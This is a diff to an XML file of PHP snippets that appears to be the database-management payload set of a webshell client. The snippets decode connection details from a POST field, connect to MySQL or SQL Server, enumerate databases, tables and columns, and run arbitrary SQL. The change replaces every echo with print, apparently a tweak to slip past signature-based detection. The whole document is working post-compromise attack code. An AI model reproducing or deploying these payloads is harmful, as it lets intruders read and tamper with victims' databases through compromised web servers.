@@ -9,7 +9,7 @@
       <item><![CDATA[$C=base64_decode($_POST["$connStr$"]);
 list($host,$user,$pwd,$lan)=explode(";",$C);
 $T=@mysql_connect($host,$user,$pwd);
-echo $T?"1":"0";
+print($T?"1":"0");
 @mysql_close($T);]]></item>
     </func>
     <func>
@@ -23,7 +23,7 @@ $T=@mysql_connect($host,$user,$pwd);
 $q=@mysql_query("SHOW DATABASES");
 while($rs=@mysql_fetch_row($q))
 {
-	echo(trim($rs[0]).chr(9));
+	print(trim($rs[0]).chr(9));
 }
 @mysql_close($T);]]></item>
     </func>
@@ -40,7 +40,7 @@ $T=@mysql_connect($host,$user,$pwd);
 $q=@mysql_query("SHOW TABLES FROM `{$db}`");
 while($rs=@mysql_fetch_row($q))
 {
-	echo(trim($rs[0]).chr(9));
+	print(trim($rs[0]).chr(9));
 }
 @mysql_close($T);]]></item>
     </func>
@@ -59,7 +59,7 @@ $T=@mysql_connect($host,$user,$pwd);@mysql_select_db($db);
 $q=@mysql_query("SHOW COLUMNS FROM `{$col}`");
 while($rs=@mysql_fetch_row($q))
 {
-	echo(trim($rs[0])." (".$rs[1].")".chr(9));
+	print(trim($rs[0])." (".$rs[1].")".chr(9));
 }
 @mysql_close($T);]]></item>
     </func>
@@ -81,17 +81,17 @@ $q=@mysql_query($sql);
 $i=0;
 while($col=@mysql_field_name($q,$i))
 {
-	echo($col."\t|\t");$i++;
+	print($col."\t|\t");$i++;
 }
-echo("\r\n");
+print("\r\n");
 while($rs=@mysql_fetch_row($q))
 {
 	for($c=0;$c<$i;$c++)
 	{
-		echo(trim($rs[$c]));
-		echo("\t|\t");
+		print(trim($rs[$c]));
+		print("\t|\t");
 	}
-	echo("\r\n");
+	print("\r\n");
 }
 @mysql_close($T);]]></item>
     </func>
@@ -110,9 +110,9 @@ $T=@mysql_connect($host,$user,$pwd);
 @mysql_query("SET NAMES utf8");
 @mysql_select_db($db);
 $q=@mysql_query($sql);
-echo("Result\t|\t\r\n");
-echo($q?"Execute Successfully!":mysql_error());
-echo("\t|\t\r\n");
+print("Result\t|\t\r\n");
+print($q?"Execute Successfully!":mysql_error());
+print("\t|\t\r\n");
 @mysql_close($T);]]></item>
     </func>
 	
@@ -127,10 +127,10 @@ $connInfo = array("UID"=>$user,"PWD"=>$pwd);
 $conn = sqlsrv_connect($host,$connInfo);
 $err=sqlsrv_errors();
 if($conn){
-	echo "1";
+	print("1");
 	sqlsrv_close($conn);
 }else{
-	echo "ERROR://".$err[0]['message'];
+	print("ERROR://".$err[0]['message']);
 }]]></item>
     </func>
 	<func>
@@ -145,15 +145,15 @@ $sql="SELECT name FROM Master..SysDatabases ORDER BY 1;";
 $conn=sqlsrv_connect($host,$connInfo);
 $err=sqlsrv_errors();
 if(!$conn){
-	echo "ERROR://".$err[0]['message'];
+	print("ERROR://".$err[0]['message']);
 }else{
 	$q=sqlsrv_query($conn,$sql);
 	if($q){
 		while($rs=sqlsrv_fetch_array($q))
-		{echo(trim($rs[0]).chr(9));}
+		{print(trim($rs[0]).chr(9));}
 	}else{
 		$err=sqlsrv_errors();
-		echo "ERROR://".$err[0]['message'];
+		print("ERROR://".$err[0]['message']);
 	}
 	sqlsrv_close($conn);
 }]]></item>
@@ -172,15 +172,15 @@ $sql="SELECT name FROM sysobjects WHERE (xtype='U') ORDER BY 1;";
 $conn=sqlsrv_connect($host,$connInfo);
 $err=sqlsrv_errors();
 if(!$conn){
-	echo "ERROR://".$err[0]['message'];
+	print("ERROR://".$err[0]['message']);
 }else{
 	$q=sqlsrv_query($conn,$sql);
 	if($q){
 		while($rs=sqlsrv_fetch_array($q))
-		{echo(trim($rs[0]).chr(9));}
+		{print(trim($rs[0]).chr(9));}
 	}else{
 		$err=sqlsrv_errors();
-		echo "ERROR://".$err[0]['message'];
+		print("ERROR://".$err[0]['message']);
 	}
 	sqlsrv_close($conn);
 }]]></item>
@@ -201,15 +201,15 @@ $sql="SELECT A.[name],B.[name] FROM syscolumns A,systypes B where A.id=object_id
 $conn=sqlsrv_connect($host,$connInfo);
 $err=sqlsrv_errors();
 if(!$conn){
-	echo "ERROR://".$err[0]['message'];
+	print("ERROR://".$err[0]['message']);
 }else{
 	$q=sqlsrv_query($conn,$sql);
 	if($q){
 		while($rs=sqlsrv_fetch_array($q))
-		{echo(trim($rs[0])." (".$rs[1].")".chr(9));}
+		{print(trim($rs[0])." (".$rs[1].")".chr(9));}
 	}else{
 		$err=sqlsrv_errors();
-		echo "ERROR://".$err[0]['message'];
+		print("ERROR://".$err[0]['message']);
 	}
 	sqlsrv_close($conn);
 }]]></item>
@@ -229,26 +229,26 @@ $connInfo=array("UID"=>$user,"PWD"=>$pwd,"Database"=>$db);
 $conn=sqlsrv_connect($host,$connInfo);
 $err=sqlsrv_errors();
 if(!$conn){
-	echo "ERROR://".$err[0]['message'];
+	print("ERROR://".$err[0]['message']);
 }else{
 	$q=sqlsrv_query($conn,$sql);
 	if($q){
 		foreach(sqlsrv_field_metadata($q) as $field)
 		{
-			echo "$field[Name]\t|\t";
+			print("$field[Name]\t|\t");
 		}
-		echo("\r\n");
+		print("\r\n");
 		while($rs=sqlsrv_fetch_array($q,SQLSRV_FETCH_ASSOC))
 		{
 			foreach($rs as $value)
 			{
-				echo (($value instanceof DateTime)?$value->format('Y-m-d H:i:s'):trim($value))."\t|\t";
+				print((($value instanceof DateTime)?$value->format('Y-m-d H:i:s'):trim($value))."\t|\t");
 			}
-			echo("\r\n");
+			print("\r\n");
 		}
 	}else{
 		$err=sqlsrv_errors();
-		echo "ERROR://".$err[0]['message'];
+		print("ERROR://".$err[0]['message']);
 	}
 	sqlsrv_close($conn);
 }]]></item>
@@ -268,20 +268,20 @@ $connInfo=array("UID"=>$user,"PWD"=>$pwd,"Database"=>$db);
 $conn=sqlsrv_connect($host,$connInfo);
 $err=sqlsrv_errors();
 if(!$conn){
-	echo "ERROR://".$err[0]['message'];
+	print("ERROR://".$err[0]['message']);
 }else{
 	$q=sqlsrv_query($conn,$sql);
 	if($q){
 		$affected = sqlsrv_rows_affected($q);
 		if(!$affected){
-			echo "ERROR://".$err[0]['message'];
+			print("ERROR://".$err[0]['message']);
 		}
 		else{
-			echo "Result\r\n".$affected." rows affected";
+			print("Result\r\n".$affected." rows affected");
 		}
 	}else{
 		$err=sqlsrv_errors();
-		echo "ERROR://".$err[0]['message'];
+		print("ERROR://".$err[0]['message']);
 	}
 	sqlsrv_close($conn);
 }]]></item>
